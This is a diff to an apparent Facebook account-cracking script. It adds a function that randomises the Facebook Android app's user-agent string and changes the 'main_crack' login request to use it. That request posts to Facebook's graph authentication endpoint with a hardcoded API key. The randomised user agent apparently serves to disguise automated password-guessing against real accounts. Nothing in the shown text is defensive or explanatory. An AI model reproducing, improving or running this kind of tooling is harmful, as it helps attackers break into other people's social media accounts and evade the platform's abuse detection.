@@ -253,9 +253,7 @@ SM-G359C
 SM-R096P
 SM-F952H
 SM-Y608N
-SM-C736V
-> 
-""".splitlines()
+SM-C736V""".splitlines()
 
 
 
@@ -280,6 +278,11 @@ def randBuildLSB():
     ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/SP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
     return ua
 
+def randFBAN():
+  VAPP = random.randint(410000000,499999999)
+  ua="[FBAN/FB4A;FBAV/470.1.80.24.874;FBBV/"+str(VAPP)+";FBDM/{density=2.5,width=780,height=1920};FBLC/fr_IN;FBRV/4214899694;FBCR/1030;FBMF/Realme;FBBD/Ostin;FBPN/com.facebook.katana;FBDV/"+random.choice(model2)+";FBSV/16;FBOP/5;FBCA/arm64-v8a:;]"
+  return ua
+
 def randBuildvsskj():
     END = '[FBAN/EMA;FBBV/352223683;FBAV/291.0.0.12.110;FBDV/SM-G935ES;FBLC/en_GB;FBNG/WIFI;FBMNT/NOT_METERED;FBDM/{density=1.0125}]'
     ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/RP2A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
@@ -300,7 +303,7 @@ logo =                                          """
     
 ××××××××××××××××××××××××××××××××××
 \033[1;37m Github  : mogid458
-\033[1;37m Version : 0.1
+\033[1;37m Version : 0.2
 ××××××××××××××××××××××××××××××××××
 \033[1;37m """
 def clear():
@@ -420,7 +423,7 @@ class main_crack():
 "fb_api_req_friendly_name": "authenticate",
 "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
 "api_key": "882a8490361da98702bf97a021ddc14d"}
-                headers = {'User-Agent': "[FBAN/FB4A;FBAV/267.0.0.77.61;FBBV/246206728;FBRV/0;FBPN/com.facebook.katana;FBLC/bs_BA;FBMF/Honor;FBBD/Honor;FBDV/Honor 689T;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]",
+                headers = {'User-Agent':randFBAN(),
 'Content-Type': 'application/x-www-form-urlencoded',
 'Host': 'graph.facebook.com',
 'X-FB-Net-HNI': str(random.randint(20000, 40000)),
